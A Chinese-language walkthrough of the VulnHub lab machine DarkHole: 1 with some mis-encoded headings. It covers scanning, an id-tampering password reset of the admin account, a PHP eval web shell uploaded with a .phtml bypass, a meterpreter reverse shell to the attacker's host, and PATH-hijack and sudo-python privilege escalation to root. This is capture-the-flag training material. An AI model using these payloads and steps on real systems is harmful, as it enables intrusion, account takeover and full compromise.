# DarkHole: 1

> https://www.vulnhub.com/entry/darkhole-1,724/
> 

## ç«¯å£æ‰«æä¸»æœºå‘ç°

1. æ¢æµ‹å­˜æ´»ä¸»æœºï¼Œ`184`æ˜¯é¶æœº
    
    ```php
    nmap -sP 192.168.75.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 09:59 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00027s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00016s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.184
    Host is up (0.00032s latency).
    MAC Address: 00:0C:29:61:C5:52 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. æ¢æµ‹ä¸»æœºæ‰€æœ‰å¼€æ”¾ç«¯å£
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.184
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 09:59 CST
    Nmap scan report for 192.168.75.184
    Host is up (0.0011s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:61:C5:52 (VMware)
    ```
    
3. æ¢æµ‹æœåŠ¡ç‰ˆæœ¬ä»¥åŠç³»ç»Ÿç‰ˆæœ¬
    
    ```php
    nmap -sV -sT -O -p 80,22 192.168.75.184
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 09:59 CST
    Nmap scan report for 192.168.75.184
    Host is up (0.0022s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    MAC Address: 00:0C:29:61:C5:52 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. æ‰«ææ¼æ´
    
    ```python
    nmap -script=vuln -p 80,22 192.168.75.184
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 10:00 CST
    Nmap scan report for 192.168.75.184
    Host is up (0.00057s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.184
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |       httponly flag not set
    |   /login.php: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |   /login.php: Possible admin folder
    |   /config/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |_  /upload/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    MAC Address: 00:0C:29:61:C5:52 (VMware)
    ```
    

## webæ¸—é€

1. è®¿é—®ä¸»é¡µï¼Œå­˜åœ¨ç™»å½•é¡µé¢é“¾æ¥
    
    ![image.png](image%2070.png)
    
2. å…ˆæ‰«æç›®å½•çœ‹çœ‹
    
    ```python
    dirsearch -u http://192.168.75.184 -x 403,404 
    //
    [10:07:48] Starting:                                                                                                                                         
    [10:07:48] 301 -  313B  - /js  ->  http://192.168.75.184/js/                
    [10:08:10] 301 -  317B  - /config  ->  http://192.168.75.184/config/        
    [10:08:10] 200 -  460B  - /config/                                          
    [10:08:11] 301 -  314B  - /css  ->  http://192.168.75.184/css/              
    [10:08:12] 200 -   21B  - /dashboard.php                                    
    [10:08:21] 200 -  487B  - /js/                                              
    [10:08:23] 200 -    1KB - /login.php                                        
    [10:08:24] 302 -    0B  - /logout.php  ->  login.php                        
    [10:08:35] 200 -    1KB - /register.php                                     
    [10:08:45] 301 -  317B  - /upload  ->  http://192.168.75.184/upload/        
    [10:08:45] 200 -  456B  - /upload/       
    ```
    
    - `/dashboard.php`  æ— æƒé™
    - `/upload` ä¸Šä¼ æ–‡ä»¶å¤¹
    - `/config` å­˜åœ¨database.php
3. ç™»é™†é¡µé¢å­˜åœ¨æ³¨å†Œï¼Œæˆ‘ä»¬æ³¨å†Œç”¨æˆ·`test`ç™»å½•
    
    è¿›å»åå‘ç°å¯ä»¥`update`ä¿¡æ¯ä»¥åŠæ›´æ”¹å¯†ç ï¼Œæ„Ÿè§‰ä¼šå­˜åœ¨æ³¨å…¥
    
    ![image.png](image%2071.png)
    
4. æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥
    - `Details Update` éƒ¨åˆ†
        
        ä½¿ç”¨`sql`æµ‹è¯•æ²¡æ‰¾åˆ°æ³¨å…¥ç‚¹
        
    - `Password Change` éƒ¨åˆ†
        
        è¿™éƒ¨åˆ†æ²¡æ³¨å…¥â€¦.ä½†æ˜¯ä¿®æ”¹å¯†ç åŒºåŸŸå¯ä»¥æŠ“åŒ…å°†ä¼ å…¥çš„`id`å€¼ä¿®æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ä¿®æ”¹ä¸º`id=1`çš„ç”¨æˆ·ï¼ˆå¯èƒ½æ˜¯ç®¡ç†ç”¨æˆ·ï¼‰
        
        ```python
        POST /dashboard.php?id=2 HTTP/1.1
        Host: 192.168.75.184
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 20
        Origin: http://192.168.75.184
        Sec-GPC: 1
        Connection: keep-alive
        Referer: http://192.168.75.184/dashboard.php?id=2
        Cookie: PHPSESSID=aal4svnq3poomufcq5sv2lo2fu
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        
        password=123456&id=1
        ```
        
        æˆåŠŸå°†åŒ…å‘é€ï¼Œæç¤º`Password has been change`
        
5. ç™»é™†åå°ï¼Œç”¨æˆ·åä½¿ç”¨`admin` ï¼Œå¯†ç æ˜¯ç”¨ä¿®æ”¹åçš„`123456` ï¼ŒæˆåŠŸè¿›å…¥
    
    ![image.png](image%2072.png)
    
    å¤šäº†ä¸ªä¸Šä¼ æ–‡ä»¶æ¡†
    
6. å°è¯•æ–‡ä»¶ä¸Šä¼ ä¸Šä¼ ğŸ
    - ç›´æ¥ä¸Šä¼ `2.php` ï¼Œå†…å®¹æ˜¯ä¸€å¥é©¬ï¼Œæç¤ºï¼š`Sorry , Allow Ex : jpg,png,gif` çœ‹ç€åƒæ˜¯ç™½åå•
    - å°è¯•äº†ä¸€ä¸‹ï¼Œä¸åªæ˜¯å¯ä»¥ä¸Šä¼ `jpg,png,gif` ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ åˆ«çš„åç¼€æ–‡ä»¶ï¼Œæ‰€ä»¥æ›´åƒæ˜¯æŠŠ`php`ç±»çš„æ–‡ä»¶åç¼€æ”¾è¿›é»‘åå•äº†
    - è¿™é‡Œæ¶‰åŠåˆ°ä¸€äº›æ–‡ä»¶ä¸Šä¼ `CTF`çš„å¥—è·¯ï¼Œæˆ‘ä»¬å°†`php`æ”¹ä¸ºå…¶ä»–å¯ä»¥è§£é‡Šä¸º`php`æ–‡ä»¶çš„åç¼€ï¼Œæˆ‘å°†å…¶ä¿®æ”¹ä¸º`phtml` ï¼Œä¸Šä¼ æˆåŠŸï¼ˆæˆ‘æ˜¯æŠ“åŒ…åä¿®æ”¹çš„ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹æ–‡ä»¶åç¼€ç„¶åç›´æ¥ä¸Šä¼ ï¼‰
        
        ```python
        Content-Disposition: form-data; name="fileToUpload"; filename="2.phtml"
        Content-Type: application/octet-stream
        
        <?php @eval($_POST[x]); ?>
        ```
        
    - ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨äº†`/upload`è·¯å¾„ï¼Œæµ‹è¯•èƒ½å¦ä½¿ç”¨
        
        ![image.png](image%2073.png)
        
        å¯ä»¥æ­£å¸¸åŒ…å«
        
7. ä½¿ç”¨èšğŸ—¡è¿æ¥
    
    ![image.png](image%2074.png)
    

## ææƒ

1. æˆ‘ä»¬å…ˆåå¼¹`shell` ï¼Œé¶æœºè‡ªå¸¦çš„`nc`ä¸æ”¯æŒ`-e` ,æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸Šä¼ åå¼¹`shell`è„šæœ¬ç„¶ååŒ…å«
    - ç”Ÿæˆè„šæœ¬
        
        ```python
        msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.75.151 lport=1234 -f raw > getshell.php
        [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
        [-] No arch selected, selecting arch: php from the payload
        No encoder specified, outputting raw payload
        Payload size: 1115 bytes
        ```
        
    - åœ¨èšğŸ—¡å°†è„šæœ¬ä¸Šä¼ `upload`æ–‡ä»¶å¤¹é‡Œ
        
        ![image.png](image%2075.png)
        
    - `kali`æ‰“å¼€`msf`ç›‘å¬
        
        ```python
        msf6 > use exploit/multi/handler 
        [*] Using configured payload generic/shell_reverse_tcp
        msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
        payload => php/meterpreter/reverse_tcp
        msf6 exploit(multi/handler) > set lhost 192.168.75.151
        lhost => 192.168.75.151
        msf6 exploit(multi/handler) > set lport 1234
        lport => 1234
        msf6 exploit(multi/handler) > run
        ```
        
    - ç½‘é¡µè®¿é—®ä¸Šä¼ çš„è„šæœ¬æ–‡ä»¶
        
        ![image.png](image%2076.png)
        
    - è·å¾—`shell`
        
        ```python
        [*] Started reverse TCP handler on 192.168.75.151:1234 
        [*] Sending stage (39927 bytes) to 192.168.75.184
        [*] Meterpreter session 1 opened (192.168.75.151:1234 -> 192.168.75.184:55480) at 2024-11-08 11:49:08 +0800
        
        meterpreter > 
        ```
        
        è¾“å…¥shellè·å¾—shellå‘½ä»¤è¡Œ
        
2. æŸ¥çœ‹æƒé™
    
    ```python
    $ whoami
    www-data
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ uname -a
    Linux darkhole 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    ```
    
3. å¯»æ‰¾åˆ©ç”¨ç‚¹
    - SUIDæƒé™
        
        ```python
        $ find / -perm -u=s -type f 2>/dev/null
        /usr/lib/snapd/snap-confine
        /usr/lib/policykit-1/polkit-agent-helper-1
        /usr/lib/eject/dmcrypt-get-device
        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        /usr/lib/openssh/ssh-keysign
        /usr/bin/su
        /usr/bin/at
        /usr/bin/umount
        /usr/bin/pkexec
        /usr/bin/sudo
        /usr/bin/passwd
        /usr/bin/chfn
        /usr/bin/chsh
        /usr/bin/gpasswd
        /usr/bin/fusermount
        /usr/bin/newgrp
        /usr/bin/mount
        /home/john/toto
        ```
        
        `/home/john/toto` è¿™ä¸ªä¸€çœ‹å°±ä¸å¯¹åŠ²
        
    - æ•°æ®åº“é…ç½®æ–‡ä»¶
        
        ```python
        $ cat database.php
        <?php
        $connect = new mysqli("localhost",'john','john','darkhole');
        ```
        
        å¯ä»¥å°è¯•å¯†ç ç¢°æ’`ssh`ï¼Œä½†æ˜¯å¯†ç é”™è¯¯
        
4. æ¥åˆ°`/home/john/` ï¼Œä¸‹æœ‰å››ä¸ªæ–‡ä»¶
    
    ```python
    $ ls
    file.py
    password
    toto
    user.txt
    ```
    
    ä½†æ˜¯é™¤äº†`toto`æœ‰è¯»å’Œæ‰§è¡Œæƒé™ï¼Œåˆ«çš„éƒ½æ²¡æœ‰æƒé™ï¼Œå‰é¢`suid`ä¹Ÿæœç´¢å‡ºäº†`toto` ï¼Œå°è¯•åˆ©ç”¨
    
5. åˆ©ç”¨`toto`
    - å› ä¸ºä¸çŸ¥é“æœ‰ä»€ä¹ˆä½œç”¨ï¼Œæˆ‘ä»¬ç›´æ¥æ‰§è¡Œ
        
        ```python
        $ ./toto
        uid=1001(john) gid=33(www-data) groups=33(www-data)
        ```
        
    - æˆ‘ä»¬é€šè¿‡èšğŸ—¡ä¸‹è½½è¯¥æ–‡ä»¶ä¸‹æ¥ï¼Œä½¿ç”¨`IDA`åç¼–è¯‘çœ‹çœ‹å†™äº†å•¥
        
        ```python
        int __fastcall main(int argc, const char **argv, const char **envp)
        {
          setuid(0x3E9u);
          setgid(0x3E9u);
          return system("id");
        }
        ```
        
        è®¾ç½®`UID`ç„¶åè®¾ç½®`GID`æœ€åè¾“å‡º`ID`å‘½ä»¤
        
    - åŠ«æŒç¯å¢ƒå˜é‡
        
        å› ä¸ºä»–ä¼šæ‰§è¡Œ`id` ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹ç¯å¢ƒå˜é‡è®©ä»–æ‰§è¡Œidçš„æ—¶å€™æ‰§è¡Œ`/bin/bash`
        
        ```python
        $ echo "/bin/bash" > /tmp/id
        $ chmod 777 /tmp/id
        $ export PATH=/tmp:$PATH 
        ```
        
        `$ export PATH=/tmp:PATH`  è®¾ç½®`/tmp`ä¸ºç¯å¢ƒå˜é‡çš„å¼€å¤´ï¼Œé‚£æ ·å°±å¯ä»¥ä¸€å¼€å§‹å°±å»`/tmp`å¯»æ‰¾ `id` ä¹Ÿå°±æ˜¯`/bin/bash`
        
        æ‰§è¡Œ`toto` ï¼Œè·å¾—`john`çš„shell
        
        ```python
        $ ./toto
        john@darkhole:/home/john$
        ```
        
6. è·å¾—`john`çš„ç”¨æˆ·åæŸ¥çœ‹ä¹‹å‰æ²¡æƒé™çœ‹çš„æ–‡ä»¶
    - `password` æ˜¯`john`çš„å¯†ç ï¼Œæˆ‘ä»¬ç”¨å®ƒå»`ssh`ç™»å½•`john`è·å¾—æ›´å¥½çš„ç”¨æˆ·äº¤äº’`shell`
        
        ```python
        john@darkhole:~$ cat password 
        root123
        ```
        
    - `file.py`æ˜¯ç©ºçš„
        
        ```python
        ohn@darkhole:~$ cat file.py 
        
        ```
        
    - `user.txt` ä¸€ä¸ª`flag`
        
        ```python
        john@darkhole:~$ cat user.txt 
        DarkHole{You_Can_DO_It}
        ```
        
7. å¯»æ‰¾åˆ©ç”¨ç‚¹
    - æŸ¥çœ‹`sudo`æƒé™
        
        ```python
        john@darkhole:~$ sudo -l
        [sudo] password for john: 
        Matching Defaults entries for john on darkhole:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
        
        User john may run the following commands on darkhole:
            (root) /usr/bin/python3 /home/john/file.py
        ```
        
        å¯ä»¥ä½¿ç”¨`root`æƒé™æ‰§è¡Œ`file.py`æ–‡ä»¶ï¼Œå“¦è±ï¼Œå¯ä»¥ææƒäº†
        
    - ç¼–è¾‘`file.py`æ–‡ä»¶ï¼Œå°†ææƒè¯­å¥å†™å…¥`file.py`
        
        ```python
        ehco "import os;os.system('/bin/bash');" >> file.py
        ```
        
    - ä½¿ç”¨`sudo`æƒé™æ‰§è¡Œ
        
        ```python
        john@darkhole:~$ sudo /usr/bin/python3 /home/john/file.py 
        root@darkhole:
        ```
        
        è·å¾—rootï¼ï¼ï¼
        
8. è¯»å–`flag`æ–‡ä»¶
    
    ```python
    root@darkhole:~# cat root.txt 
    DarkHole{You_Are_Legend}
    ```